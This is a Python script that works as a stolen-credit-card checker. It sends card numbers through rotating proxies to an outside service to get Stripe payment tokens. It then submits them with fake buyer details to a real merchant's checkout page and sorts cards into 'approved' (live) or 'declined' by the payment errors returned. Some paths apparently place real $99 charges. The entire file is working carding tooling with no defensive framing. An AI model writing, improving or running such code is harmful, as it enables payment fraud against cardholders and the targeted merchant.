import requests
import re
import time
from proxy_manager import get_proxy_dict

def get_fresh_nonce(card_details):
    try:
        proxies = get_proxy_dict()
        first_url = f"https://astrer.tech/chk/stccn.php?card={card_details}"
        response = requests.get(first_url, timeout=15, proxies=proxies)
        
        if response.status_code == 200:
            data = response.json()
            nonce = data.get("nonce")
            attr = data.get("attr")
            pm_id = data.get("pm_id")
            
            if nonce and attr and pm_id:
                return {'nonce': nonce, 'attr': attr, 'pm_id': pm_id, 'proxies': proxies}
        return None
    except:
        return None

def check_card(card_data: str) -> dict:
    try:
        parts = card_data.strip().split('|')
        if len(parts) != 4:
            return {
                'card': card_data,
                'status': 'INVALID',
                'message': 'Invalid format. Use: XXXX|MM|YY|CVV',
                'approved': False
            }
        
        fresh_data = get_fresh_nonce(card_data)
        
        if not fresh_data:
            return {
                'card': card_data,
                'status': 'ERROR',
                'message': 'API Dead or Expired',
                'approved': False
            }
        
        nonce = fresh_data['nonce']
        attr = fresh_data['attr']
        pm_id = fresh_data['pm_id']
        proxies = fresh_data.get('proxies')

        second_url = "https://growthhackyourcareer.com/resume-masterclass-checkout/"
        payload = {
            "s2member_pro_stripe_checkout[coupon]": "",
            "s2member_pro_stripe_checkout[first_name]": "John",
            "s2member_pro_stripe_checkout[last_name]": "Smith",
            "s2member_pro_stripe_checkout[email]": f"test{int(time.time())}@gmail.com",
            "s2member_pro_stripe_checkout[username]": f"user{int(time.time())}",
            "stripe_pm_id": pm_id,
            "stripe_pi_id": "",
            "stripe_seti_id": "",
            "stripe_sub_id": "",
            "stripe_pi_secret": "",
            "stripe_seti_secret": "",
            "s2member_pro_stripe_checkout[street]": "123 Main St",
            "s2member_pro_stripe_checkout[city]": "New York",
            "s2member_pro_stripe_checkout[state]": "NY",
            "s2member_pro_stripe_checkout[zip]": "10001",
            "s2member_pro_stripe_checkout[country]": "US",
            "s2member_pro_stripe_checkout[nonce]": nonce,
            "s2member_pro_stripe_checkout[attr]": attr
        }

        headers = {
            "Cache-Control": "max-age=0",
            "Origin": "https://growthhackyourcareer.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Referer": "https://growthhackyourcareer.com/resume-masterclass-checkout/",
        }

        cookies = {
            "__stripe_mid": "7be83e83-b35b-48ec-8962-d76b644341bef9f70c",
            "__stripe_sid": "c9cf794f-b97a-4ba4-a5c7-de94c25835455d418d"
        }

        response2 = requests.post(second_url, data=payload, headers=headers, cookies=cookies, timeout=20, proxies=proxies)
        response_text = response2.text

        match = re.search(r'<div id="s2member-pro-stripe-form-response".*?>(.*?)</div>', response_text, re.DOTALL)
        
        if match:
            error_message = match.group(1).strip()
            
            if "insufficient funds" in error_message.lower():
                return {
                    'card': card_data,
                    'status': 'APPROVED',
                    'message': 'Insufficient Funds (CVV Match)',
                    'approved': True
                }
            elif "incorrect_cvc" in error_message.lower():
                return {
                    'card': card_data,
                    'status': 'APPROVED',
                    'message': 'Incorrect CVC (Live Card)',
                    'approved': True
                }
            elif "succeeded" in error_message.lower() or "success" in error_message.lower():
                return {
                    'card': card_data,
                    'status': 'APPROVED',
                    'message': 'Charged $99',
                    'approved': True
                }
            elif "requires_action" in error_message.lower() or "3d" in error_message.lower():
                return {
                    'card': card_data,
                    'status': 'APPROVED',
                    'message': '3D Secure Required',
                    'approved': True
                }
            else:
                return {
                    'card': card_data,
                    'status': 'DECLINED',
                    'message': error_message[:150] if len(error_message) > 150 else error_message,
                    'approved': False
                }
        else:
            if "success" in response_text.lower() or "thank" in response_text.lower():
                return {
                    'card': card_data,
                    'status': 'APPROVED',
                    'message': 'Charged $99',
                    'approved': True
                }
            return {
                'card': card_data,
                'status': 'DECLINED',
                'message': 'No response found',
                'approved': False
            }

    except Exception as e:
        return {
            'card': card_data,
            'status': 'ERROR',
            'message': str(e),
            'approved': False
        }
